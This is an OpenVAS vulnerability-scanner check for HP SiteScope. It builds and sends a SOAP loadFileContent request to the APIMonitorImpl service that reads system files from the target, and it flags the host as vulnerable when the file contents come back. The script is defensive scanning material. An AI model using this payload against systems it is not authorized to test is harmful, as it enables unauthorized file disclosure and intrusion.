###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sitescope_55269.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# HP SiteScope Multiple Security Bypass Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:hp:sitescope";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103560");
  script_cve_id("CVE-2012-3259", "CVE-2012-3260", "CVE-2012-3261", "CVE-2012-3262",
               "CVE-2012-3263", "CVE-2012-3264");
  script_bugtraq_id(55269, 55273);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13659 $");

  script_name("HP SiteScope Multiple Security Bypass Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55269");
  script_xref(name:"URL", value:"http://www.hp.com/");

  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-09-07 17:11:57 +0200 (Fri, 07 Sep 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_hp_sitescope_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("hp/sitescope/installed");
  script_require_ports("Services/www", 8080);

  script_tag(name:"summary", value:"HP SiteScope is prone to multiple security-bypass vulnerabilities.");
  script_tag(name:"impact", value:"Successful exploits may allow attackers to bypass the bypass security
  restrictions and to perform unauthorized actions such as execution of
  arbitrary code in the context of the application.");
  script_tag(name:"solution", value:"Updates are available. Please contact the vendor.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

useragent = http_get_user_agent();
host = http_host_name(port:port);

files =  traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  soap = string("<?xml version='1.0' encoding='UTF-8'?>\r\n",
                "<wsns0:Envelope\r\n",
                "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\r\n",
                "xmlns:xsd='http://www.w3.org/2001/XMLSchema'\r\n",
                "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\r\n",
                ">\r\n",
                "<wsns0:Body\r\n",
                "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\r\n",
                ">\r\n",
                "<impl:loadFileContent\r\n",
                "xmlns:impl='http://Api.freshtech.COM'\r\n",
                ">\r\n",
                "<in0\r\n",
                "xsi:type='xsd:string'\r\n",
                "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\r\n",
                ">",file,"</in0>\r\n",
                "</impl:loadFileContent>\r\n",
                "</wsns0:Body>\r\n",
                "</wsns0:Envelope>\r\n");
  len = strlen(soap);

  req = string("POST ", dir, "/services/APIMonitorImpl HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               'SOAPAction: ""',"\r\n",
               "Content-Type: text/xml; charset=UTF-8\r\n",
               "Content-Length: ",len,"\r\n",
               "\r\n",
                soap);
  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(eregmatch(string:result, pattern:pattern)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
